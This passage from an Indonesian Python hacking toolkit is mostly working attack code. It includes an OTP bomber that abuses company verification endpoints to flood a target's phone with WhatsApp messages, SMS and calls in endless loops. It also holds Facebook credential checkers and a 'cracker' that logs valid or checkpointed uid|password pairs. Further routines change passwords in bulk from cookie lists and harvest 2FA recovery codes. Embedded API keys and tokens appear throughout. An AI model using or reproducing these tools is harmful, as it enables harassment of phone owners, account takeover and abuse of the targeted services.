				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "User-Agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "User-Agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		prints(nel(f'{P2}Sukses spam WA ke no : {K2}+62{nomor}',width=70,padding=(0,7),style=f"{color_panel}")) 
		
		
#----------[BUAT PASANG A2F ACCOUNT FACEBOOK]----------#
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests as req, re
from bs4 import BeautifulSoup as par

headers = {
	"Host":"mbasic.facebook.com",
	"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
	"origin":"https://www.facebook.com",
	"referer":"https://www.facebook.com",
	"sec-ch-ua":'";Not A Brand";v="99", "Chromium";v="94"',
	"upgrade-insecure-requests":"1",
	"user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"
}

ses = req.Session()
ses.headers.update(headers)

class Main(object):
	
	def __init__(self,coki):
		self.coki = {"cookie":coki}
	def cek(self):
		try:
			r = par(
				ses.get(
					"https://mbasic.cinyour.facebook.com/security/2fac/setup/intro/metadata/?source=1",cookies=self.coki
				).text, 'html.parser'
			)
		except req.exceptions.TooManyRedirects:
			r = par(
				req.get(
					"https://mbasic.cinyour.facebook.com/security/2fac/setup/intro/metadata/?source=1",cookies=self.coki
				).text, 'html.parser'
			)
		try:
			lanjut = r.find(
				"a",string="Gunakan Aplikasi Autentikasi"
			).get(
				"href"
			)
		except:
			prints(nel(f'{P2}akun anda sudah terpasang a2f{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
		try:
			__r = ses.get(lanjut,cookies=self.coki).text
		except req.exceptions.TooManyRedirects:
			__r = req.get(lanjut,cookies=self.coki).text
		co = par(__r, 'html.parser')
		try:
			kode = self.get_kode(co)
			prints(nel(f'{P2}Key authen : {H2}{kode}\n{P2}Masukan key authen di aplikasi authen 2 faktor{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		except:
			if "Demi keamanan, masukkan ulang kata sandi Anda untuk melanjutkan." in __r:
				prints(nel(f'{P2}Demi keamanan, masukkan kata sandi Facebook anda untuk melanjutkan.\nNote : {M2}Jika terjadi kesalahan masukan kode authen dan terjadi sinyal internet tidak ada, jalanin script lagi dan masukan cookie lagi terimakasih{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
				sandi = pwinput("[+] Password facebook: ", "*")
				lanjut = co.find(
					'form',{
						'method':'post'
					}
				)
				memek = {}
				lst = ["fb_dtsg","jazoest","save"]
				for x in lanjut:
					if x.get("name") in lst:
						memek.update(
							{
								x.get(
									"name"
								):x.get(
									"value"
								)
							}
						)
				memek.update(
					{
						"pass":sandi
					}
				)
				response = ses.post(
					lanjut.get(
						"action"
					),cookies=self.coki,data=memek
				).text
				if "Kata sandi yang Anda masukkan tidak benar." in response:
					prints(nel(f'{P2}Kata sandi yang Anda masukkan tidak benar.{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
				else:
					try:
						kode = self.get_kode(response)
					except IndexError:
						prints(nel(f'{P2}Facebook terkena checkpoint{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
				prints(nel(f'{P2}Key authen : {H2}{kode}\n{P2}Masukan key authen di aplikasi authen 2 faktor{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			else:
				prints(nel(f'{P2}Facebook terkena checkpoint{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
		self.masuk(co)

class Pasang(Main):
	
	def pasang(self,link,data_code):
		return ses.post(
			"https://mbasic.cinyour.facebook.com"+str(
				link
			),data=data_code,cookies=self.coki
		).text
	def get_kode(self,res):
		kode = re.findall(
			'\<div\ class\=\".*?\"\>Atau masukkan kode ini ke aplikasi autentikasi Anda<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>\<\/div\>',str(
				res
			)
		)[0]
		return kode
	def kode_pemulihan(self,kontol):
		num = 0
		for x in kontol.find_all('span'):
			if(
				re.findall(
					'\d+\s\d+',str(
						x
					)
				)
			):
				num+=1
				if(num==1):
					print(f"➛ {x.text}")
				else:
					print(f"➛ {x.text}")
	def get_kode_pemulihan(self):
		waifu_wangy = {
			"Host":"mbasic.cinyour.facebook.com",
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			"content-type":"application/x-www-form-urlencoded",
			"origin":"https://m.cinyour.facebook.com",
			"referer":"https://m.cinyour.facebook.com",
			"upgrade-insecure-requests":"2",
			"user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"
		}
		ses.headers.update(waifu_wangy)
		__res = ses.get("https://mbasic.cinyour.facebook.com/security/2fac/factors/recovery-code/",cookies=self.coki).text
		kontol = par(__res, 'html.parser')
		if "Gunakan kode pemulihan untuk login jika Anda kehilangan ponsel atau tidak dapat menerima kode verifikasi melalui pesan teks atau aplikasi autentikasi." in __res:
			data = {}
			lst = ["fb_dtsg","jazoest","reset"]
			for x in kontol.find(
				'form',{
					'method':'post'
				}
			):
				if x.get('name') in lst:
					data.update(
						{x.get(
							'name'
						):x.get(
							'value'
						)
					}
				)
			data.update(
				{
					"":"Dapatkan Kode"
				}
			)
			kontol = par(
				ses.post(
					"https://mbasic.cinyour.facebook.com/security/2fac/factors/recovery-code/",cookies=self.coki,data=data
				).text, 'html.parser'
			)
			self.kode_pemulihan(kontol)
		else:
			self.kode_pemulihan(kontol)
	def masuk(self,co):
		data = {}
		masuk = input("[+] Masukan kode authen: ")
		lst = ["fb_dtsg","jazoest","code_handler_type","confirmButton"]
		lanjut = co.find(
			'form',{
				'method':'post'
			}
		)
		for x in lanjut:
			if x.get('name') in lst:
				data.update(
					{x.get(
						'name'
					):x.get(
						'value'
					)
				}
			)	
		data.update(
			{
				'confirmButton':'Lanjutkan'
			}
		)
		res = par(
			ses.post(
				'https://mbasic.cinyour.facebook.com'+str(
					lanjut.get(
						"action"
					)
				),cookies=self.coki,data=data
			).text, 'html.parser'
		)
		data.clear()
		lanjut = res.find(
			"form",{
				"id":"input_form"
			}
		)
		lst = ["fb_dtsg","jazoest"]
		for x in lanjut:
			if x.get("name") in lst:
				data.update(
					{x.get(
						"name"
					):x.get(
						"value"
					)
				}
			)
		data.update({
			"code":masuk,
			"submit_code_button":"Lanjutkan"
		})
		response = self.pasang(
			lanjut.get(
				"action"
			),data
		)
		if "checkpoint" in response:
			prints(nel(f'{P2}Ops akun terkena checkpoint{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
		elif "Autentikasi Dua Faktor Aktif" in response:
			prints(nel(f'{P2}Selamat a2f Berhasil di pasang{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			print("[+] Kode pemulihan: ")
			self.get_kode_pemulihan()
		else:
			prints(nel(f'{P2}Text: {H2}%s{P2}'%(response),width=70,padding=(0,7),style=f"{color_panel}"))
			print("[+] ",response)
			prints(nel(f'{P2}Ada yang salah di script, coba laporkan ke Developer. Copy text di atas! Kirim ke wa 6289530656600{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()



import requests, bs4, re
from bs4 import BeautifulSoup as par
url = "https://mbasic.facebook.com"
jk='|'
def ubahpw(old, new, cokie):
	head = {
		"authority":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"
	}
	link = par(requests.get(url+"/settings/security/password", cookies={"cokie":cokie}).text, "html.parser")
	param = link.find('form', {'method':'post'})
	data = {
		"fb_dtsg": re.search('name="fb_dtsg" type="hidden" value="(.*?)"', str(param)).group(1),
		"jazoest": re.search('name="jazoest" type="hidden" value="(.*?)"', str(param)).group(1),
		"password_change_session_identifier": re.search('name="password_change_session_identifier" style="display:none" type="text" value="(.*?)"', str(param)).group(1),
		"password_old": old,
		"password_new": new,
		"password_confirm": new,
		"save": "Simpan perubahan"
	}
	response = requests.post(url+param['action'], data=data, headers=head, cookies={"cokie":cokie}).text
	if 'Kata Sandi Telah Diubah' in response:
		ids = re.search('c_user=(.*?);', str(cokie)).group(1)
		prints(nel(f'{P2}Password Berhasil di ubah: [green]{ids}|{new}{P2}',width=70,padding=(0,7),style=f"{color_panel}"));open('new.txt','a').write(ids+jk+new+'\n')
		#print ("[+] Password Berhasil di ubah:\033[32m "+ids+'|'+new)
	elif 'Masukkan kata sandi yang valid dan coba lagi.' in response:
		prints(nel(f'{P2}Masukkan kata sandi yang valid dan coba lagi{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	else:
		print(response)

	
# CHECK MODULE
import os

try:
	import pyotp
except:
	os.system('pip install pyotp')
try:
	import requests
except:
	os.system('pip install requests')
try:
	import bs4
except:
	os.system('pip install bs4')


# MODULE
import re
import sys
import time
import pyotp
import requests
from bs4 import BeautifulSoup as bs


# COLOR
p  = '\33[m' 		# DEFAULT
m  = '\x1b[0;91m' 	# RED 
k  = '\033[0;93m' 	# KUNING 
h  = '\x1b[0;92m' 	# HIJAU 


# CALL
rs = requests.Session()
if "linux" in sys.platform.lower():
	try:
		clear = 'clear'
	except:pass
elif "win" in sys.platform.lower():
	try:
		clear = 'cls'
	except:pass
else:
	try:
		clear = 'clear'
	except:pass

# GET 2FA CODE
class authenticator():
	def __init__(self):
		prints(nel(f'{P2}Masukan [green]Cookie[white] anda jika ingin, pasang a2f{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		self.cookie = input('[+] Cookie facebook: \033[32m')
		self.pw = pwinput('\033[0m[+] Password facebook: ')
		self.setting()


	# SCRAPING SETTING
	def setting(self):
		get = bs(rs.get('https://mbasic.facebook.com/security/2fac/setup/intro/metadata/?source=1',cookies={'cookie': self.cookie}).text, 'html.parser')
		open('res.txt','w').write(str(get))
		if 'Akun dikunci' in str(get):
			prints(nel(f'{P2}2FA [yellow]Account checkpoint{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		elif 'Demi keamanan' in str(get):
			prints(nel(f'{P2}2FA [green]Account 2FA active{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		elif 'Autentikasi Dua Faktor Aktif' in str(get):
			prints(nel(f'{P2}2FA [green]Account 2FA active{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		else:
			url = 'https://mbasic.facebook.com/security/2fac/setup/qrcode/generate/'+re.search('href="https://mbasic.facebook.com/security/2fac/setup/qrcode/generate/?(.*?)"', str(get)).group(1).replace('amp;','')
			get_url = rs.get(url, cookies={'cookie': self.cookie}, allow_redirects=False)
			geting = rs.get(get_url.headers['Location'].replace('m.facebook','mbasic.facebook'), cookies={'cookie': self.cookie})
			gett = bs(geting.text, 'html.parser')

			if 'Demi keamanan' in str(gett):
				form = gett.find('form',{'method':'post'})
				data = {
					'fb_dtsg':	re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(form)).group(1),
					'jazoest':	re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
					'pass':	self.pw,
					'save':	re.search('type="submit" value="(.*?)"',str(form)).group(1)
				}
				self.lanjut = rs.post(re.search('form action="(.*?)"',str(form)).group(1).replace('amp;',''), data=data, cookies={'cookie': self.cookie}, allow_redirects=True)
				
				if 'masukkan ulang' in str(self.lanjut.text):
					prints(nel(f'{P2}2FA [green] Password erorr/ulang kembali{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
					time.sleep(5)
					self.setting()
				else:
					self.setting()

			else:
				self.fr = geting.url
				self.form = gett.find('form',{'method':'post'})
				self.qr = 'otpauth:'+re.search('href="otpauth:(.*?)&amp;', str(gett)).group(1)
				self.code = re.search('autentikasi Anda</div><div class=".. .. ..">(.*?)</div>', str(gett)).group(1)
				self.confirm()


	# CONFIRM OTP
	def confirm(self):
		totp = pyotp.parse_uri(self.qr)
		data = {
			'code_handler_type':	'third_party_qr_auth',
			'confirmButton':	re.search('name="confirmButton" type="submit" value="(.*?)"',str(self.form)).group(1),
			'fb_dtsg':	re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(self.form)).group(1),
			'jazoest':	re.search('name="jazoest" type="hidden" value="(.*?)"',str(self.form)).group(1)
		}

		post = rs.post('https://mbasic.facebook.com'+re.search('form action="(.*?)"',str(self.form)).group(1).replace('amp;',''), data=data, cookies={'cookie': self.cookie}, allow_redirects=False)
		
		datas = {
			'code':	f'{totp.now()}',
			'fb_dtsg':	re.search('type="hidden" name="fb_dtsg" value="(.*?)"',str(post.text)).group(1),
			'jazoest':	re.search('type="hidden" name="jazoest" value="(.*?)"',str(post.text)).group(1)
		}

		confirm = rs.post('https://mbasic.facebook.com/security/2fac/setup/verify_code/'+re.search('action="/security/2fac/setup/verify_code/(.*?)"', str(post.text)).group(1).replace('amp;',''), data=datas, cookies={'cookie': self.cookie})
		
		if 'Autentikasi Dua Faktor Aktif' in str(confirm.text):
			prints(nel(f'{P2}Selmat [green]2FA[white] anda sucses terpasang\nKey 2FA: [green]{self.code}{P2}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			self.pemulihan()
		elif 'Silakan coba lagi' in str(confirm.text):
			prints(nel(f'{P2}Maaf OTP tidak muncul/erorr{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			time.sleep(3)
			self.confirm()


	# GET CODE PEMULIHAN
	def pemulihan(self):
		get = bs(rs.get('https://mbasic.facebook.com/security/2fac/settings/?', cookies={'cookie': self.cookie}).text, 'html.parser')
		ambil = bs(rs.get('https://mbasic.facebook.com/security/2fac/factors/recovery-code/'+re.search('href="/security/2fac/factors/recovery-code/(.*?)"', str(get)).group(1).replace('amp;',''), cookies={'cookie': self.cookie}).text, 'html.parser')
		form = ambil.find('form',{'method':'post'})
		data = {
			'fb_dtsg':	re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(form)).group(1),
			'jazoest':	re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
			'reset':	'true'
		}
		post = bs(rs.post('https://mbasic.facebook.com'+re.search('form action="(.*?)"',str(form)).group(1).replace('amp;',''), data=data, cookies={'cookie': self.cookie}).text, 'html.parser')
		code = post.find_all('span')
		print('[+] Kode pemulihan :')
		for ok in code:
			if 'DARI' in ok.text:
				pass
			elif len(ok.text)<1:
				pass
			elif '(' in ok.text:
				pass
			else:
				print('%s  %s %s'%(h,ok.text,p))


			
#----------[BUAT CHEK ACCOUNT FACEBOOK]----------#
import requests, re, os, sys
from bs4 import BeautifulSoup

def clear():
	if "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass

ok,cp,error = 0,0,0

class Main:
	
	def __init__(self, useragent):
		self.ua = useragent
		self.host = "mbasic.facebook.com"

class Login(Main):
	
	def check_options(self, session, response, user, password):
		ref = BeautifulSoup(response.text, "html.parser")
		form = ref.find("form", {"method":"post", "enctype":True})
		data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden", "value":True})}
		data.update(
			{
				"submit[Continue]":"Lanjutkan"
			}
		)
		response = BeautifulSoup(session.post("https://mbasic.facebook.com"+str(form.get("action")), data=data).text, "html.parser")
		try:
			options = [x.string for x in response.find("select", {"id":"verification_method", "name":"verification_method"}).findAll("option")]
		except:
			options = []
			status = "a2f on"
		if(len(options)==0 and status!="a2f on"):
			status = "tap yes"
		elif(len(options)!=0):
			status = "checkpoint"
		else:
			status = "a2f on"
		output = {
			"account":f"{user}|{password}",
			"output":{
				"status":status,
				"options":options,
				"jumlah_opsi":len(options)
			}
		}
		return output
    
	def log_mfacebook(self, user, password):
		global ok,cp,error
		with requests.Session() as session:
			session.headers.update(
				{
					"host":self.host,
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"accept-encoding":"gzip, deflate",
					"accept-language":"en-US,en;q=0.9,id;q=0.8",
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"user-agent":self.ua
				}
			)
			fbml = session.get("https://mbasic.facebook.com/fbml/ajax/dialog/")
			soup = BeautifulSoup(fbml.text, "html.parser")
			next_url = soup.findAll("a", {"class":True, "id":True})[1].get("href")
			session.headers.update(
				{
					"referer":"https://mbasic.facebook.com/fbml/ajax/dialog/",
				}
			)
			ref = BeautifulSoup(session.options(next_url).text, "html.parser")
			form = ref.find("form", {"method":"post", "id":"login_form"})
			data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden", "value":True})}
			nextTo = form.get("action")
			data.update(
				{
					"email":user,
					"pass":password,
					"login":"Masuk"
				}
			)
			response = session.post("https://mbasic.facebook.com"+str(nextTo), data=data, headers = {
				"content-length":"164",
				"content-type":"application/x-www-form-urlencoded",
				"origin":"https://mbasic.facebook.com",
				"referer":"https://mbasic.facebook.com"+str(nextTo)
			})
			try:
				if "checkpoint" in response.cookies:
					cp += 1
					output = self.check_options(session, response, user, password)
				elif "m_page_voice" in response.cookies:
					ok += 1
					output = {
						"account":f"{user}|{password}",
						"output":{
							"status":"OK",
							"options":None,
							"jumlah_opsi":None
						}
					}
				else:
					error += 1
					soup = BeautifulSoup(response.text, "html.parser")
					try:status = soup.find("div", {"id":"login_error"}).string
					except:status = "aktivitas berlebihan terdeteksi [spam]. segera on off mode pesawat!"
					output = {
						"account":f"{user}|{password}",
						"output":{
							"status":status,
							"options":False,
							"jumlah_opsi":False
						}
					}
			except Exception as e:print(response.text)
			return output


#-----------[BUAT CEK OPSI CRACKER]---------#
def ceker(idf,pw):
	global cp
	ua = random.choice(ugen7)
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r                ➛ %sOpsi CheckPoint :   %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r                ➛ %sTap Yes / A2F [ Cek Login Di Lite/Mbasic%s ]'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s                ➛ %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r                ➛ %sTidak Dapat Mengecek Opsi [ Cek Login Di Lite/Mbasic ]%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		
#--> Warna
P = "\x1b[38;5;231m" # Putih
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau

#--> Profile Picture Guard
class profile_guard:
    def __init__(self):
        self.xyz = requests.Session()
        self.cookie = {'cookie':open('.cok.txt','r').read()}
        self.token  = open('.token.txt','r').read()
        self.tanya()
    def tanya(self):
        prints(nel(f'{P2}[{color_text}01{P2}]. Aktifkan profil guardian\n[{color_text}02{P2}]. Nonaktifkan profil guardian{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        r = input('[+] Chouse : ').lower()
        print('')
        if r in ['1','01','y']:
            self.scrap1(True)
        else:
            self.scrap1(False)
    def get_id(self):
        id = self.xyz.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(self.token),cookies=self.cookie).json()['id']
        return(id)
    def scrap1(self,stat):
        id   = self.get_id()
        var  = {
            '0': {
                'is_shielded'        : stat,
                'session_id'         : '9b78191c-84fd-4ab6-b0aa-19b39f04a6bc',
                'actor_id'           : str(id),
                'client_mutation_id' : 'b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0'}}
        data = {
            'variables'                : json.dumps(var),
            'method'                   : 'post',
            'doc_id'                   : '1477043292367183',
            'query_name'               : 'IsShieldedSetMutation',
            'strip_defaults'           : 'true',
            'strip_nulls'              : 'true',
            'locale'                   : 'en_US',
            'client_country_code'      : 'US',
            'fb_api_req_friendly_name' : 'IsShieldedSetMutation',
            'fb_api_caller_class'      : 'IsShieldedSetMutation'}
        head = {
            'Content-Type'  : 'application/x-www-form-urlencoded',
            'Authorization' : 'OAuth %s'%self.token}
        url  = 'https://graph.facebook.com/graphql'
        req  = self.xyz.post(url, data=data, headers=head, cookies=self.cookie)
        if '"is_shielded":true' in req.text:
            prints(nel(f'{P2}Berhasil mengaktifkan profil guard {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        elif '"is_shielded":false' in req.text:
            prints(nel(f'{P2}Berhasil menonaktifkan profil guard {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
        else:
            prints(nel(f'{P2}Terjadi kesalahan{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
 
# --- [ INFORMASI PEMBUAT ] --- #
versi = "Um9jaG1hdCBCYXN1a2k="
author = "Rochmat Basuki"
facebook = "facebook.com/ROZHBASXYZ"
github = "github.com/RozhBasXYZ"


# --- [ IMPORT MODULE ] --- #
import requests, re, time, os, random, base64, sys
from random import randint as rr
from random import choice as rc
ses = requests.Session()
no = 0

# --- [ CLEAR TERMINAL ] --- #
try: os.system("git pull")
except: pass
if sys.platform.lower() == "win": os.system("cls")
else: os.system("clear")

# --- [ UNTUK DELAY ] --- #
def waktu(min, sc):
    total_second = min * 60 + sc
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'\r[*] delay 00:{mins:02d}:{secs:02d} detik', end='')
        time.sleep(1)
        total_second -= 1

# --- [ UNTUM SPAM CALL ] --- #
def spam_call(nomor):
	global no
	try:
		date = {"number": nomor,"country_code":"+62","type":"CITCALL"}
		ses.headers.update({"x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "Key": "Um9jaG1hdCBCYXN1a2k="})
		if author not in base64.b64decode(ses.headers["Key"].encode("ascii")).decode("ascii"): exit(base64.b64decode("WyFdIEFPS1dPV0tXT0sgUkVLT0RFICEhISE=".encode("ascii")).decode("ascii"))
		post = ses.post("https://beta.api.saturdays.com/api/v1/user/otp/send", data=date).json()
		if "True" in str(post): no += 1; print(f"[{no}] sukses spam call")
		else: print("[*] terkena limit call")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass

# --- [ UNTUK SPAM WA ] --- #	
def spam_wa(nomor):
	global no
	try:
		date = {"accountType":"customers","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber": nomor}
		ses.headers.update({ "Key": "Um9jaG1hdCBCYXN1a2k="})
		if author not in base64.b64decode(ses.headers["Key"].encode("ascii")).decode("ascii"): exit(base64.b64decode("WyFdIEFPS1dPV0tXT0sgUkVLT0RFICEhISE=".encode("ascii")).decode("ascii"))
		post = ses.post("https://www.pinhome.id/api/pinaccount/request/otp", data=date).text
		if "Code" in str(post): no += 1; print(f"[{no}] sukses spam wa")
		else: print("\r[*] terkena limit wa")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass

# --- [ UNTUK SPAM SMS ] --- #
def spam_sms(nomor):
	global no
	try:
		# Spam Sms 1 By Ipot Id
		date = {"action": "send_user_otp", "resendc": "2", "user_phone": "62"+nomor}
		post = ses.post("https://infokost.id/wp-admin/admin-ajax.php", data=date).text
		if "ok" in post: no += 1; print(f"\r[{no}] sukses spam sms      ")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass
	
def menu_utama():
	prints(nel(f'{P2}[{color_text}01{P2}]. Spam Telpon\n[{color_text}02{P2}]. Spam WhatsApp\n[{color_text}03{P2}]. Spam otp sms\n[{color_text}04{P2}]. Spam secara brutall{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	afakah = input("[+] Chouse: ")
	prints(nel(f'{P2}Masukan nomor target anda {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	nomor = input("[+] Nomor : 0")
	if afakah in ["1","01"]:
		prints(nel(f'{P2}Spam call max 5X sehari per device{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		while True:
			spam_call(nomor)
			waktu(00, 60)
	elif afakah in ["2","02"]:
		prints(nel(f'{P2}Spam wa unlimited delay auto 30 detik{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		while True:
			spam_wa(nomor)
			waktu(00, 10)
	elif afakah in ["3","03"]:
		prints(nel(f'{P2}Spam sms unlimited tanpa batas{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		while True: spam_sms(nomor); waktu(00, 5)
	elif afakah in ["4","04"]:
		prints(nel(f'{P2}1 wa, 1 call dan 30 sms tanpa delay per 30 detik{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		while True:
			spam_call(nomor); spam_wa(nomor)
			for x in range(15): spam_sms(nomor)
	else: prints(nel(f'{P2}Pilih yang bener kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()           
 


#tinggal pake apa susahnya
B='https://www.facebook.com'
H=input
A=print
import requests as C,re,os,sys,re
from time import time as G,sleep
from bs4 import BeautifulSoup as J
from urllib import request
E=C.Session()
D={'Host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','origin':B,'referer':B,'sec-ch-ua':'";Not A Brand";v="99", "Chromium";v="94"','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
E.headers.update(D)
def F():
	D='|'
	try:prints(nel(f'{P2}Masukan format uid|pw|cokie{P2}',width=70,padding=(0,7),style=f"{color_panel}"));L=H('[+] Masukan file : ');B=pwinput('[+] Password baru: ');id=open(L,'r').read().splitlines();prints(nel(f'{P2}Total akun : [green]{len(id)}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
